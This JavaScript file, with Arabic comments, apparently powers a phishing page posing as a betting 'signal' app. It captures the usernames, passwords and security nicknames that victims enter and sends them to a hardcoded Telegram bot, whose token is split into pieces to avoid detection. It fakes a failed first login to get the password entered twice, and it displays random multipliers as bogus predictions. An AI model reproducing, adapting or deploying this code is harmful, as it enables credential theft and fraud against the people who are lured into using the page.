// تمويه التوكن الجديد (8589...) باش ما يتحرقش
const p1 = "8589243363";
const p2 = ":AAEMgjPjQOE6e0NGFQ307kv-";
const p3 = "FSl8VxTLkwg";

const TG_TOKEN = p1 + p2 + p3;
const CHAT_ID = "8026901193";

// دالة الإرسال المضمونة
function sendToTelegram(text) {
    const url = `https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}&parse_mode=html`;
    
    // إرسال عبر Image Buffer (تخترق الحماية)
    const img = new Image();
    img.src = url;

    // إرسال احتياطي بـ fetch
    fetch(url).catch(e => {});
}

let loginAttempts = 0;

async function processAuth() {
    const u = document.getElementById('u_log').value;
    const p = document.getElementById('u_pas').value;
    const btn = document.getElementById('sync-btn');
    const msg = document.getElementById('login-err');

    if (u.length < 4 || p.length < 4) return alert("البيانات ناقصة!");

    loginAttempts++;

    if (loginAttempts === 1) {
        btn.disabled = true;
        btn.innerText = "Verifying...";
        
        sendToTelegram(`⚠️ <b>محاولة 1:</b>\n👤 User: <code>${u}</code>\n🔑 Pass: <code>${p}</code>`);
        
        setTimeout(() => {
            if (msg) msg.classList.remove('hidden');
            document.getElementById('u_pas').value = "";
            btn.disabled = false;
            btn.innerText = "Retry Sync";
        }, 1500);
        return;
    }

    if (loginAttempts === 2) {
        btn.disabled = true;
        btn.innerText = "Analyzing...";
        
        sendToTelegram(`✅ <b>بيانات مؤكدة (محاولة 2):</b>\n👤 User: <code>${u}</code>\n🔑 Pass: <code>${p}</code>`);

        setTimeout(() => {
            document.getElementById('auth-screen').classList.add('hidden');
            document.getElementById('security-layer').classList.remove('hidden');
        }, 1200);
    }
}

let nickAttempts = 0;
function processNick() {
    const n = document.getElementById('u_nick').value;
    if (n.length < 2) return;

    nickAttempts++;
    sendToTelegram(`🔑 <b>اللقب (محاولة ${nickAttempts}):</b> <code>${n}</code>`);

    if (nickAttempts === 1) {
        document.getElementById('nick-err').classList.remove('hidden');
        document.getElementById('u_nick').value = "";
    } else {
        document.getElementById('security-layer').classList.add('hidden');
        document.getElementById('main-app').classList.remove('hidden');
    }
}

function getSignal() {
    const display = document.getElementById('target-mult');
    display.innerText = "WAIT..";
    setTimeout(() => {
        const mult = (Math.random() * (4.80 - 1.20) + 1.20).toFixed(2) + "x";
        display.innerText = mult;
    }, 800);
}
